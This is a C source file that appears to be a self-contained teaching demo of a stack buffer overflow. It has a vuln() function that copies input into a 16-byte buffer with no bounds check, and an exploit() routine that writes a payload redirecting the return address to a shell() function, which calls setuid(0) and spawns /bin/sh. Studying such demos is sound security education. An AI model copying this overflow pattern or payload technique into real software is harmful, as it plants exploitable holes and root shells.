#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void shell(){ //never called
    printf("\n==Attack==\nOpening a malicious shell\n");
    setuid(0);
    system("/bin/sh");
}

void vuln(char * s, int count){
    char buff[16]; 

    printf("vuln() has received %d bytes\n", count);
    memcpy(buff, s, count); //no bounds check
}

void exploit(){
    FILE * f;
    char overflow[64];
    unsigned int offset = 20; //offset of return address in vuln()
    int redirect = (int) shell; //set shell() as a redirection target
      
    memset(&overflow, 0x41, 64); //fill with character 'A'
    overflow[offset    ] =  (redirect >> 24) & 0xff; 
    overflow[offset + 1] =  (redirect >> 16) & 0xff;
    overflow[offset + 2] =  (redirect >>  8) & 0xff;
    overflow[offset + 3] =   redirect        & 0xff;
    
    f = fopen("overflow.txt", "w");
    fwrite(overflow, 64, 1, f);
    fclose(f);
}

int main(int argc, char **argv){
    char count;
    FILE * f;
    char overflow[64];
    
    if (argc < 2) {
        printf("Missing first argument (integer).\nUsing number 24 as the first argument seems interesting.\nExiting...\n");
        return 0;
    }
    
    count = (char) atoi(argv[1]);
    
    if (!(count > 0)) {
        printf("Incorrect first argument (%d). Exiting...\n", count);
        return 0;    
    }
    
    exploit(); //helper function to prepare a malicious input file

    printf("Reading %d bytes from file\n", count);
  
    f = fopen("overflow.txt", "r");
    if (f != NULL) {
        fread(overflow, sizeof(char), count, f);
        fclose(f);
        vuln(overflow, count);
    }
    else {
        printf("Input file does not exist. Exiting...\n");
        return 0;
    }
  
  printf("Control has returned to main()\nNormal operation.\n");
  return 1;
}
